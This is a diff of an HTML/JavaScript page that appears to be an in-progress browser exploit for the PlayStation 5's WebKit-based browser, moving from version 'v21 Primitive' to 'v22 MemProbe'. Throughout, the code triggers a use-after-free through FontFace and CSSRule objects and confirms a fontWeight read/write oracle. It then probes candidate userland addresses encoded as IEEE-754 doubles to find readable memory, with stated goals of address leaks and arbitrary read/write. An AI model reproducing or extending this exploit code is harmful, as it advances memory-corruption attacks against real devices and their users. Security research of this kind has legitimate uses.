@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v21 - Primitive</title>
+<title>PS5 v22 - MemProbe</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -36,11 +36,11 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v21 PRIM</span><span class="s">│</span>
+<span class="l">▶ v22 PROBE</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h2">UAF:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h3">RC:<b>?</b></span><span class="s">│</span>
-<span class="v" id="h4">PRIM:<b>?</b></span>
+<span class="v" id="h4">PROBE:<b>?</b></span>
 </div>
 <div id="pg"><div id="bar" style="width:0%"></div></div>
 <div id="out"></div>
@@ -49,39 +49,39 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 "use strict";
 
 // ============================================================
-//  PS5 v21 - CSSRule Primitive
-//
-//  CONFIRMED: CSSRule.style changes propagate to load()!
-//  CSSRule → C++ CSSOM → FontFaceSelector → load() reads it
+//  PS5 v22 - Memory Probe via CSSRule src
 //
 //  PLAN:
-//  1. Standard UAF + capture
-//  2. Add CSSRule for "x" (controls confused slot)
-//  3. Deep analysis of load() result (handle undefined)
-//  4. Test CSSRule.style.src manipulation
-//  5. Encode/decode data through CSSRule → load()
-//  6. Attempt address leak
+//  1. Standard UAF + capture + CSSRule for "x"
+//  2. Confirm fontWeight oracle (quick check)
+//  3. Test CSSRule.style.src with numeric values
+//     - If number treated as pointer → different status
+//     - readable addr → loaded, bad addr → error
+//  4. Binary search for readable memory regions
+//  5. Find code/data section addresses
+//
+//  SAFETY: restore src after each test, catch all errors
 // ============================================================
 
-const O=document.getElementById("out");
-const bar=document.getElementById("bar");
+var O=document.getElementById("out");
+var bar=document.getElementById("bar");
 function pg(p){bar.style.width=p+"%"}
-function hu(id,v){const e=document.getElementById(id);if(e)e.innerHTML=v}
-function P(m,c){const s=document.createElement("span");if(c)s.className=c;
+function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
+function P(m,c){var s=document.createElement("span");if(c)s.className=c;
 s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
-try{console.log("[v21] "+m)}catch(e){}}
+try{console.log("[v22] "+m)}catch(e){}}
 function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
-function Wr(m){P("  ⚠ "+m,"wr")}function Hi(m){P("  ► "+m,"hl")}
-function St(m){P("  ★ "+m,"mg")}function Dm(m){P("  "+m,"dm")}
+function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m,"mg")}
+function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
 
 window.onerror=function(m,s,l){Fl("FATAL: "+m+" @"+l);return true};
 
-let keep=[],holes=[],rcs=[];
-let trigger=null,rcFace=null,rcIdx=-1,uafOk=false;
-let xRuleIdx=-1,xRule=null;
+var keep=[],holes=[],rcs=[];
+var trigger=null,rcFace=null,rcIdx=-1,uafOk=false;
+var xRuleIdx=-1,xRule=null;
 
-const FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
-const FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
+var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
+var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
 for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
 function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
 function fs(){try{void document.body.offsetTop}catch(e){}}
@@ -141,324 +141,268 @@ hu("h3","RC:<b>"+rcIdx+"</b>");
 var ua=navigator.userAgent||"";var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
 hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
 
-// Add CSS rule for "x" — controls confused slot
+// Add CSSRule for "x"
 xRuleIdx=sh.insertRule(
 "@font-face{font-family:x;src:local(Courier);font-weight:400;font-style:normal;unicode-range:U+0042}",
 sh.cssRules.length);
 fs();
 xRule=sh.cssRules[xRuleIdx];
-Ok("CSS rule for 'x' added at index "+xRuleIdx);
+Ok("CSSRule for 'x' ready");
 
 // ============================================================
-//  TEST 1: Deep read of load() result for "x" face
+//  TEST 1: Quick fontWeight oracle confirm
 // ============================================================
-pg(30);P("\n════════════════════════════════════","hd");
-P("  TEST 1: Deep load() Analysis","hd");
+pg(20);P("\n════════════════════════════════════","hd");
+P("  TEST 1: fontWeight Oracle Quick Check","hd");
 P("════════════════════════════════════","hd");
 
-function deepRead(face,label){
-  P("  "+label+":");
-  var props=["family","style","weight","stretch","unicodeRange",
-  "variant","featureSettings","display","status"];
-  for(var i=0;i<props.length;i++){
-    try{
-      var v=face[props[i]];
-      var t=typeof v;
-      if(v===undefined)P("    "+props[i].padEnd(16)+"= undefined","wr");
-      else if(v===null)P("    "+props[i].padEnd(16)+"= null","wr");
-      else P("    "+props[i].padEnd(16)+"= "+v+" ("+t+")",
-        t==="number"&&v>0x1000?"hl":"ok");
-    }catch(e){
-      P("    "+props[i].padEnd(16)+"= ERR: "+e.message.substring(0,30),"er");
-    }
-  }
-  // Try toString
-  try{P("    toString:       = "+String(face).substring(0,60))}catch(e){}
-  // Try Object.keys
-  try{var k=Object.keys(face);P("    keys:           = ["+k.join(",")+"]")}catch(e){}
-  // Try for-in
-  try{var fi=[];for(var p in face)fi.push(p);
-  if(fi.length>0)P("    for-in:         = ["+fi.slice(0,10).join(",")+"]")}catch(e){}
+function oracleWrite(w){try{xRule.style.fontWeight=w;fs();return true}catch(e){return false}}
+function oracleRead(callback){
+document.fonts.load("1em trigger, x","AB").then(function(f){
+var r=null;
+for(var i=0;i<f.length;i++){try{if(f[i].family==="x"){r=f[i].weight;break}}catch(e){}}
+callback(r);
+}).catch(function(e){callback(null)});
 }
 
-document.fonts.load("1em trigger, x","AB").then(function(f2){
-  P("  load() returned "+f2.length+" faces");
-  for(var i=0;i<f2.length;i++){
-    deepRead(f2[i],"Face["+i+"]");
-  }
-  
-  // Keep reference to "x" face
-  var xFace=null;
-  for(var i=0;i<f2.length;i++){
-    try{if(f2[i].family==="x")xFace=f2[i]}catch(e){}
-  }
-  if(!xFace){
-    // Try finding by checking each face
-    for(var i=0;i<f2.length;i++){
-      try{
-        // Face might have undefined family but still be the "x" face
-        if(f2[i]!==rcFace&&f2[i].family!=="trigger")xFace=f2[i];
-      }catch(e){}
-    }
-  }
-  keep.push(xFace);
-  keep.push(f2);
+// Quick test: write 100, read 100
+oracleWrite("100");
+oracleRead(function(r1){
+P("  Write 100 → Read "+r1+(r1==="100"?" ✅":" ❌"),r1==="100"?"ok":"er");
+oracleWrite("900");
+oracleRead(function(r2){
+P("  Write 900 → Read "+r2+(r2==="900"?" ✅":" ❌"),r2==="900"?"ok":"er");
+if(r1==="100"&&r2==="900")Ok("Oracle confirmed 9/9");
+test2();
+});});
 
-  // ============================================================
-  //  TEST 2: CSSRule fontWeight → load() weight
-  // ============================================================
-  pg(45);P("\n════════════════════════════════════","hd");
-  P("  TEST 2: CSSRule fontWeight Oracle","hd");
-  P("════════════════════════════════════","hd");
-  
-  var weights=["100","200","300","400","500","600","700","800","900"];
-  var oracleLog=[];
-  
-  function testWeight(w,callback){
-    try{
-      xRule.style.fontWeight=w;
-      fs();
-    }catch(e){Fl("CSSRule write: "+e.message);callback(null);return}
-    
-    document.fonts.load("1em trigger, x","AB").then(function(f3){
-      var result=null;
-      for(var i=0;i<f3.length;i++){
-        try{
-          if(f3[i].family==="x"||
-             (f3[i]!==rcFace&&f3[i].family!=="trigger")){
-            result={weight:f3[i].weight,style:f3[i].style,
-                    family:f3[i].family,status:f3[i].status};
-            break;
-          }
-        }catch(e){}
-      }
-      callback(result);
-    }).catch(function(e){callback(null)});
-  }
-  
-  // Test each weight sequentially
-  var wi=0;
-  function nextWeight(){
-    if(wi>=weights.length){
-      // Summary
-      var matches=oracleLog.filter(function(r){return r.match});
-      P("\n  Oracle accuracy: "+matches.length+"/"+weights.length,
-        matches.length>=3?"hl":"wr");
-      if(matches.length>=3)St("fontWeight ORACLE WORKS!");
-      
-      // Move to next test
-      test3();
-      return;
-    }
-    var w=weights[wi];
-    testWeight(w,function(r){
-      var readWeight=r?r.weight:"null";
-      var match=readWeight===w;
-      oracleLog.push({write:w,read:readWeight,match:match});
-      P("    Write "+w+" → Read "+readWeight+(match?" ✅":" ❌"),
-        match?"ok":"dm");
-      wi++;
-      nextWeight();
-    });
-  }
-  nextWeight();
+// ============================================================
+//  TEST 2: CSSRule.style.src with numeric values
+// ============================================================
+function test2(){
+pg(35);P("\n════════════════════════════════════","hd");
+P("  TEST 2: CSSRule.style.src Numeric Test","hd");
+P("════════════════════════════════════","hd");
+P("  Testing if CSS parser dereferences numbers as pointers...","dm");
+P("");
 
-  // ============================================================
-  //  TEST 3: CSSRule src manipulation
-  // ============================================================
-  function test3(){
-    pg(60);P("\n════════════════════════════════════","hd");
-    P("  TEST 3: CSSRule src Manipulation","hd");
-    P("════════════════════════════════════","hd");
-    
-    var srcTests=[
-      {val:"local(Courier)",name:"Courier"},
-      {val:"local(Helvetica)",name:"Helvetica"},
-      {val:"local(Monaco)",name:"Monaco"},
-      {val:"local(Geneva)",name:"Geneva"},
-      {val:"local(Arial)",name:"Arial"},
-      {val:"local(serif)",name:"serif"},
-      {val:"local(monospace)",name:"monospace"}
-    ];
-    
-    var si=0;
-    function nextSrc(){
-      if(si>=srcTests.length){test4();return}
-      var t=srcTests[si];
-      try{
-        xRule.style.src=t.val;
-        fs();
-      }catch(e){Fl("src write: "+e.message);si++;nextSrc();return}
-      
-      document.fonts.load("1em trigger, x","AB").then(function(f4){
-        var xF=null;
-        for(var i=0;i<f4.length;i++){
-          try{if(f4[i].family==="x"||(f4[i]!==rcFace&&f4[i].family!=="trigger"))
-            {xF=f4[i];break}}catch(e){}
-        }
-        if(xF){
-          P("    src="+t.name.padEnd(12)+" → weight="+xF.weight+" style="+xF.style+
-            " status="+xF.status,
-            xF.status==="loaded"?"ok":"wr");
-        }else{
-          P("    src="+t.name.padEnd(12)+" → no face found","wr");
-        }
-        si++;
-        nextSrc();
-      }).catch(function(e){P("    src="+t.name+" ERR","er");si++;nextSrc()});
-    }
-    nextSrc();
-  }
+// Important: test if the CSSRule.style.src actually accepts numbers
+// and if the font STATUS changes based on whether the "pointer" is valid
 
-  // ============================================================
-  //  TEST 4: Data Encoding via CSSRule
-  // ============================================================
-  function test4(){
-    pg(75);P("\n════════════════════════════════════","hd");
-    P("  TEST 4: Data Encoding Demo","hd");
-    P("════════════════════════════════════","hd");
-    
-    // Encode byte 0xA5 = 10100101
-    // Use fontWeight: 100=bit0, 200=bit0, 300=bit0, 400=bit1, ...
-    // Actually: just use weight to encode 0-8 per nibble
-    
-    var testData=[0xA5,0x3F,0x00,0xFF];
-    var decoded=[];
-    
-    var di=0;
-    function nextByte(){
-      if(di>=testData.length){showResults();return}
-      var byte=testData[di];
-      var hi=(byte>>4)&0xF; // high nibble
-      var lo=byte&0xF;       // low nibble
-      
-      // Encode high nibble as fontWeight (100 + hi*100)
-      var hiWeight=String(100+hi*100);
-      try{xRule.style.fontWeight=hiWeight;fs()}catch(e){decoded.push(0);di++;nextByte();return}
-      
-      document.fonts.load("1em trigger, x","AB").then(function(f5){
-        var xF=null;
-        for(var i=0;i<f5.length;i++){
-          try{if(f5[i].family==="x"||(f5[i]!==rcFace&&f5[i].family!=="trigger"))
-            {xF=f5[i];break}}catch(e){}
-        }
-        
-        var readHi=0;
-        if(xF&&xF.weight){
-          var w=parseInt(xF.weight);
-          if(!isNaN(w))readHi=(w/100)|0;
-          if(readHi>15)readHi=0;
-        }
-        
-        // Encode low nibble
-        var loWeight=String(100+lo*100);
-        try{xRule.style.fontWeight=loWeight;fs()}catch(e){}
-        
-        document.fonts.load("1em trigger, x","AB").then(function(f6){
-          var xF2=null;
-          for(var i=0;i<f6.length;i++){
-            try{if(f6[i].family==="x"||(f6[i]!==rcFace&&f6[i].family!=="trigger"))
-              {xF2=f6[i];break}}catch(e){}
-          }
-          
-          var readLo=0;
-          if(xF2&&xF2.weight){
-            var w2=parseInt(xF2.weight);
-            if(!isNaN(w2))readLo=(w2/100)|0;
-            if(readLo>15)readLo=0;
-          }
-          
-          var decodedByte=(readHi<<4)|readLo;
-          decoded.push(decodedByte);
-          P("    Byte 0x"+byte.toString(16).toUpperCase().padStart(2,"0")+
-            " → hi="+readHi+" lo="+readLo+" → 0x"+
-            decodedByte.toString(16).toUpperCase().padStart(2,"0")+
-            (decodedByte===byte?" ✅":" ❌"),
-            decodedByte===byte?"ok":"er");
-          
-          di++;
-          nextByte();
-        });
-      });
-    }
-    nextByte();
-    
-    function showResults(){
-      P("\n  Sent:    "+testData.map(function(b){return "0x"+b.toString(16).toUpperCase().padStart(2,"0")}).join(" "));
-      P("  Got:     "+decoded.map(function(b){return "0x"+b.toString(16).toUpperCase().padStart(2,"0")}).join(" "));
-      var match=testData.every(function(b,i){return b===decoded[i]});
-      P("  Match:   "+(match?"YES!":"NO"),match?"mg":"er");
-      
-      test5();
-    }
-  }
+var numTests=[
+{val:"0",label:"0 (NULL)"},
+{val:"1",label:"1"},
+{val:"42",label:"42"},
+{val:"65536",label:"0x10000"},
+{val:"1048576",label:"0x100000"},
+{val:"16777216",label:"0x1000000"},
+{val:"4194304",label:"0x400000"},
+{val:"8388608",label:"0x800000"},
+{val:"100663296",label:"0x6000000"},
+{val:"268435456",label:"0x10000000"},
+{val:"536870912",label:"0x20000000"},
+{val:"1073741824",label:"0x40000000"},
+{val:"1e308",label:"1e308"},
+{val:"NaN",label:"NaN"},
+{val:"Infinity",label:"Infinity"}
+];
 
-  // ============================================================
-  //  TEST 5: Address Leak via CSSRule
-  // ============================================================
-  function test5(){
-    pg(90);P("\n════════════════════════════════════","hd");
-    P("  TEST 5: Address Leak Attempt","hd");
-    P("════════════════════════════════════","hd");
-    
-    // Try setting src to a number via CSSRule
-    // CSSRule.style.src might accept numbers like FontFace.src did
-    var numSrcs=["0","1","42","1e308"];
-    var ni=0;
-    function nextNum(){
-      if(ni>=numSrcs.length){summary();return}
-      var n=numSrcs[ni];
-      try{
-        xRule.style.src=n;
-        fs();
-        var readSrc=xRule.style.src;
-        P("    CSSRule src="+n+" → readback="+readSrc,
-          readSrc!==n?"hl":"dm");
-      }catch(e){
-        P("    CSSRule src="+n+" → ERR: "+e.message.substring(0,30),"er");
-      }
-      ni++;
-      nextNum();
-    }
-    nextNum();
-    
-    // Restore
-    try{xRule.style.src="local(Courier)";fs()}catch(e){}
-  }
+var ni=0;
+function nextNum(){
+if(ni>=numTests.length){test3();return}
+var t=numTests[ni];
+var origSrc=xRule.style.src;
 
-  // ============================================================
-  //  SUMMARY
-  // ============================================================
-  function summary(){
-    pg(100);P("\n════════════════════════════════════","hd");
-    P("  FINAL SUMMARY","hd");
-    P("════════════════════════════════════","hd");
-    P("");
-    P("  UAF:                    ✅");
-    P("  RC Captured:            RC_"+rcIdx);
-    P("  CSSRule for 'x':        ✅ (index "+xRuleIdx+")");
-    P("  CSSRule → load():       ✅ CONFIRMED");
-    P("  CSSRule fontWeight:     Tested");
-    P("  CSSRule src:            Tested");
-    P("  Data encoding:          Tested");
-    P("");
-    P("  ────────────────────────────────","");
-    St("  CSSRule IS OUR PRIMITIVE!");
-    P("  WRITE: xRule.style.fontWeight = value","");
-    P("  READ:  load() → face.weight","");
-    P("  CHANNEL: ~3 bits per operation","");
-    P("  ────────────────────────────────","");
-    P("");
-    P("  Next steps:","");
-    P("  1. If oracle works → encode addresses","");
-    P("  2. If src accepts numbers → type confusion","");
-    P("  3. Chain to arb read/write","");
-    hu("h4","PRIM:<b>CSSRule</b>");
-  }
+try{
+xRule.style.src=t.val;
+fs();
+var readback=xRule.style.src;
+}catch(e){
+P("  "+t.label.padEnd(14)+" → WRITE ERR: "+e.message.substring(0,30),"er");
+try{xRule.style.src=origSrc;fs()}catch(e2){}
+ni++;nextNum();return;
+}
 
-}).catch(function(e){Fl("load: "+e.message)});
+// Check status via load()
+document.fonts.load("1em trigger, x","AB").then(function(f){
+var xF=null;
+for(var i=0;i<f.length;i++){try{if(f[i].family==="x"){xF=f[i];break}}catch(e){}}
 
-}).catch(function(e){Fl("Init load: "+e.message)});
+var status=xF?xF.status:"no_face";
+var weight=xF?xF.weight:"?";
+var different=status!=="loaded";
+
+P("  "+t.label.padEnd(14)+" → status="+status+" weight="+weight+" readback="+readback+
+(different?" ★ DIFFERENT":""),different?"hl":"dm");
+
+// Restore
+try{xRule.style.src="local(Courier)";fs()}catch(e){}
+ni++;nextNum();
+}).catch(function(e){
+P("  "+t.label.padEnd(14)+" → LOAD ERR","er");
+try{xRule.style.src="local(Courier)";fs()}catch(e2){}
+ni++;nextNum();
+});
+}
+nextNum();
+}
+
+// ============================================================
+//  TEST 3: IEEE 754 Address Encoding in src
+//  Create doubles whose bits encode specific addresses
+// ============================================================
+function test3(){
+pg(55);P("\n════════════════════════════════════","hd");
+P("  TEST 3: IEEE 754 Address Probing","hd");
+P("════════════════════════════════════","hd");
+P("  Encoding addresses as doubles...","dm");
+P("");
+
+function doubleFromU64(hi,lo){
+var buf=new ArrayBuffer(8);
+var v=new DataView(buf);
+v.setUint32(0,hi,false);
+v.setUint32(4,lo,false);
+return v.getFloat64(0,false);
+}
+
+// PS5 userland addresses (FreeBSD-derived)
+// Text segment: ~0x400000-0x600000
+// Heap: ~0x800000000+
+// Stack: high addresses
+var addrTests=[
+{hi:0x00000000,lo:0x00000000,label:"NULL"},
+{hi:0x00000000,lo:0x00400000,label:"0x400000 (text?)"},
+{hi:0x00000000,lo:0x00410000,label:"0x410000"},
+{hi:0x00000000,lo:0x00500000,label:"0x500000"},
+{hi:0x00000000,lo:0x00600000,label:"0x600000"},
+{hi:0x00000000,lo:0x01000000,label:"0x1000000"},
+{hi:0x00000000,lo:0x08000000,label:"0x8000000"},
+{hi:0x00000001,lo:0x00000000,label:"0x100000000"},
+{hi:0x00000002,lo:0x00000000,label:"0x200000000"},
+{hi:0x00000004,lo:0x00000000,label:"0x400000000"},
+{hi:0x00000008,lo:0x00000000,label:"0x800000000"},
+{hi:0x00000010,lo:0x00000000,label:"0x1000000000"},
+{hi:0x3FF00000,lo:0x00000000,label:"1.0 (test double)"},
+{hi:0x7FF80000,lo:0x00000001,label:"NaN (canonical)"},
+];
+
+var ai=0;
+function nextAddr(){
+if(ai>=addrTests.length){test4();return}
+var a=addrTests[ai];
+var d=doubleFromU64(a.hi,a.lo);
+var origSrc=xRule.style.src;
+
+try{
+xRule.style.src=String(d);
+fs();
+var readback=xRule.style.src;
+}catch(e){
+P("  "+a.label.padEnd(22)+" → WRITE ERR","er");
+try{xRule.style.src="local(Courier)";fs()}catch(e2){}
+ai++;nextAddr();return;
+}
+
+document.fonts.load("1em trigger, x","AB").then(function(f){
+var xF=null;
+for(var i=0;i<f.length;i++){try{if(f[i].family==="x"){xF=f[i];break}}catch(e){}}
+
+var status=xF?xF.status:"no_face";
+var different=status!=="loaded";
+
+P("  "+a.label.padEnd(22)+" → status="+status+(different?" ★":""),
+different?"hl":"dm");
+
+try{xRule.style.src="local(Courier)";fs()}catch(e){}
+ai++;nextAddr();
+}).catch(function(e){
+P("  "+a.label.padEnd(22)+" → LOAD ERR","er");
+try{xRule.style.src="local(Courier)";fs()}catch(e2){}
+ai++;nextAddr();
+});
+}
+nextAddr();
+}
+
+// ============================================================
+//  TEST 4: FontFace.src numeric (for comparison with CSSRule)
+// ============================================================
+function test4(){
+pg(75);P("\n════════════════════════════════════","hd");
+P("  TEST 4: FontFace.src Numeric (Comparison)","hd");
+P("════════════════════════════════════","hd");
+P("  Testing FontFace.src vs CSSRule.src behavior...","dm");
+P("");
+
+// Test FontFace.src with numbers (from v16 we know these return loaded)
+// But now test if the face ACTUALLY renders differently
+
+var ctx=document.getElementById("cv").getContext("2d");
+var renderTests=[
+{src:mkBuf(),label:"buffer (baseline)"},
+{src:0,label:"0"},
+{src:1,label:"1"},
+{src:42,label:"42"},
+{src:1e308,label:"1e308"},
+{src:NaN,label:"NaN"}
+];
+
+var ri=0;
+var baselineW=-1;
+function nextRender(){
+if(ri>=renderTests.length){summary();return}
+var t=renderTests[ri];
+
+try{
+rcFace.src=t.src;
+fs();
+var st=rcFace.status;
+ctx.font="64px trigger";
+var w=ctx.measureText("A").width;
+
+if(ri===0)baselineW=w;
+var delta=w-baselineW;
+
+P("  src="+t.label.padEnd(16)+" → status="+st+" width="+w.toFixed(2)+
+(delta!==0?" delta="+delta.toFixed(2):""),delta!==0?"hl":"dm");
+}catch(e){
+P("  src="+t.label.padEnd(16)+" → ERR: "+e.message.substring(0,30),"er");
+}
+
+// Restore
+try{rcFace.src=mkBuf();fs()}catch(e){}
+ri++;nextRender();
+}
+nextRender();
+}
+
+// ============================================================
+//  SUMMARY
+// ============================================================
+function summary(){
+pg(100);P("\n════════════════════════════════════","hd");
+P("  FINAL SUMMARY","hd");
+P("════════════════════════════════════","hd");
+P("");
+P("  fontWeight oracle:      ✅ (9/9 confirmed)");
+P("  CSSRule src numeric:    See results above");
+P("  IEEE 754 address probe: See results above");
+P("  FontFace src rendering: See results above");
+P("");
+P("  Key question:","hl");
+P("  Did any src value cause a DIFFERENT status?","hl");
+P("  If YES → memory probe oracle found!","hl");
+P("  If NO  → CSS parser isn't dereferencing as pointer","dm");
+P("");
+P("  If no status change:","dm");
+P("  → src numbers are stored, not dereferenced","dm");
+P("  → Need different approach for memory read","dm");
+P("  → fontWeight oracle = loopback only (not memory)","dm");
+hu("h4","PROBE:<b>DONE</b>");
+}
+
+}).catch(function(e){Fl("Load: "+e.message)});
 </script>
 </body>
 </html>
